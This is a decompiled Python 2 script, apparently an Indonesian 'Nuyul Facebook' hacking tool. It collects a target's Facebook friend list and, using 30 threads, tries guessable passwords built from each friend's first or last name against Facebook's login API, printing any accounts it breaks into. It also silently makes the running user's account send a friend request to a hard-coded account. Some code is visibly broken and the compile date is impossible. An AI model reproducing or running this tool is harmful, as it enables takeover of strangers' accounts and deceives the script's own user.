# uncompyle6 version 3.6.7
# Python bytecode 2.7 (62211)
# Decompiled from: Python 3.8.2 (default, Mar 20 2020, 08:09:52) 
# [Clang 8.0.7 (https://android.googlesource.com/toolchain/clang b55f2d4ebfd35bf6
# Embedded file name: face.py
# Compiled at: 2020-04-39 19.12.30
import requests
from bs4 import BeautifulSoup
from requests.exceptions import ConnectionError
import time, os, sys, hashlib, json, threading
from multiprocessing.pool import ThreadPool
import urllib2, random, datetime, cookielib, emoji
logo = '\n\t        [========================]\n\t\t[   Nuyul Facebookk om   ]\n\t\t[========================]\n\t\t     \x1b[4mDeveloper Khazul\x1b[0m\n\n\t   \x1b[32;5m\x1b[4mhttps://github.com/termuxofficial-term\x1b[0m\n'

def login():
    try:
        token = open('token.txt', 'r').read()
        hack()
    except (KeyError, IOError):
        os.system('pip2 install emoji && pip2 install requests && pip2 install bs4 &> /dev/null')
        os.system('clear')
        print logo
        print '\x1b[4mLogin akun facebook om dulu:\x1b[0m\n'
        Email = raw_input('Mail: ')
        Password = raw_input('Password: ')
        url = 'https://m.facebook.com/login/?next&ref=dbl&fl&refid=8'
        data = {'email': Email, 
           'pass': Password}
        with requests.Session() as (c):
            try:
                c.get(url)
                r = c.post(url, data=data)
                b = c.get('https://m.facebook.com/home.php')
                soup = BeautifulSoup(b.content, 'html.parser')
                a = soup.find('title')
                if str(a) == '<title>Facebook</title>':
                    try:
                        sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + Email + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + Password + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
                        data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': Email, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': Password, 'return_ssl_resources': '0', 'v': '1.0'}
                        x = hashlib.new('md5')
                        x.update(sig)
                        a = x.hexdigest()
                        data.update({'sig': a})
                        url = 'https://api.facebook.com/restserver.php'
                        r = requests.get(url, params=data)
                        z = json.loads(r.text)
                        khaz = open('token.txt', 'w')
                        khaz.write(z['access_token'])
                        khaz.close()
                    except KeyError:
                        print 'Akun anda checkpoint'

                    print 'Login sukses'
                    requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                    os.system('termux-open-url https://wa.me/601136956558?text=Halo%2C%20admin%20saya%20pengguna%20tool%20mimin')
                    hack()
                else:
                    print 'Password atau email salah'
                    time.sleep(2)
                    login()
            except requests.exceptions.ConnectionError:
                print 'Jaringan kamu buruk, coba lagi'


threads = []
cekpoint = []
oks = []
id = []
idfromteman = []
idteman = []

def hack():
    global token
    try:
        token = open('token.txt', 'r').read()
    except OSError:
        print 'File token tidak ada!'

    os.system('clear')
    print logo
    idt = raw_input('\nID teman: ')
    try:
        jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
        op = json.loads(jok.text)
        print 'Retas dari: ' + op['name']
    except KeyError:
        print 'Teman tidak ada'
        exit()

    print 'Mengambil id teman ...'
    try:
        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            id.append(i['id'])

    except requests.exceptions.ConnectionError:
        print 'Jaringan kamu buruk, coba lagi'

    print ('Total id: {}').format(str(len(id)))
    print 'Crack ...\n'
    print '\x1b[36;5m\x1b[4mSabar om, orang sabar disayang janda\x1b[0m ' + emoji.emojize(':grinning_face_with_big_eyes:')
    print ''

    def main(arg):
        global cekpoint
        global oks
        user = arg
        try:
            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + token)
            b = json.loads(a.text)
            pass1 = b['first_name'] + '123'
            data = urllib2.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            q = json.load(data)
            if 'access_token' in q:
                print '==============='
                print '=> status [\x1b[32;5mOK\x1b[0m]\n'
                print '=> Email\t: ' + user
                print '=> Passwd\t: ' + pass1
                print '==============='
                oks.append(user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '==============='
                print '=> status [\x1b[32;5mOK\x1b[0m]'
                print '=> Email\t: ' + user
                print '=> Passwd\t: ' + pass1
                print '==============='
                cekpoint.append(user + pass1)
            else:
                pass2 = b['first_name'] + '12345'
                data = urllib2.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                q = json.load(data)
                if 'access_token' in q:
                    print '==============='
                    print '=> status [\x1b[32;5mOK\x1b[0m]'
                    print '=> Email\t: ' + user
                    print '=> Passwd\t: ' + pass2
                    print '==============='
                    oks.append(user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '==============='
                    print '=> status [\x1b[32;5mOK\x1b[0m]'
                    print '=> Email\t: ' + user
                    print '=> Passwd\t: ' + pass2
                    print '==============='
                    cekpoint.append(user + pass2)
                else:
                    pass3 = b['last_name'] + '123'
                    data = urllib2.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                        z = json.loads(x.text)
                        print '==============='
                        print '=> status [\x1b[32;5mOK\x1b[0m]'
                        print '=> Email\t: ' + user
                        print '=> Passwd\t: ' + pass3
                        print '==============='
                        oks.append(user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '==============='
                        print '=> status [\x1b[33;5mCP\x1b[0m]'
                        print '=> Email\t: ' + user
                        print '=> Passwd\t: ' + pass3
                        print '==============='
                        cekpoint.append(user + pass3)
                    else:
                        pass5 = ('sayang123', 'sayangku123')
                        data = urllib2.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        q = json.load(data)
                        if 'access_token' in q:
                            x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                            z = json.loads(x.text)
                            print '==============='
                            print '=> status [\x1b[32;5mOK\x1b[0m]'
                            print '=> Email\t: ' + user
                            print '=> Passwd\t: ' + pass5
                            print '==============='
                            oks.append(user + pass5)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '==============='
                            print '=> status [\x1b[33;5mCP\x1b[0m]'
                            print '=> Email\t: ' + user
                            print '=> Passwd\t: ' + pass5
                            print '==============='
                            cekpoint.append(user + pass5)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '==============='
    try:
        raw_input('\nEnter untuk hack ulang ')
        login()
    except KeyboardInterrupt:
        print 'GoodBye njeng...'


if __name__ == '__main__':
    login()
# okay decompiling nuyul.pyc
